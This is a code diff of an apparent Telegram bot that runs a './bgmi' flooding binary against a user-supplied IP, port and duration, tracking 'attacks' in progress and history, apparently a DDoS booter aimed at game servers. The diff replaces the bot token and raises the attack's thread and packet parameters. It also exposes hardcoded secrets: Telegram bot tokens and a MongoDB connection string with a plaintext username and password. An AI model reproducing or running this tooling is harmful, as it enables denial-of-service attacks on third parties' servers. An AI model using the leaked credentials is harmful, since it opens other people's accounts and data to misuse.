@@ -9,7 +9,7 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7601607062:AAHPiVrFWLumct-DE8xMTgF6KWS4E6zoHms'  # Replace with your bot token
+TELEGRAM_BOT_TOKEN = '8058370192:AAFnD32ajdE8PHZP7z6E0doBiLUbtr4Za8o'  # Replace with your bot token
 ADMIN_USER_ID = 1240179115
 MONGO_URI = "mongodb+srv://donmourya248:Santosh700@redhat.drq43.mongodb.net/RedHat?retryWrites=true&w=majority&appName=RedHat"
 DB_NAME = "Ninja786"
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./bgmi {ip} {port} {duration} {10} {900}"
+        command = f"./bgmi {ip} {port} {duration} {1500} {30}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
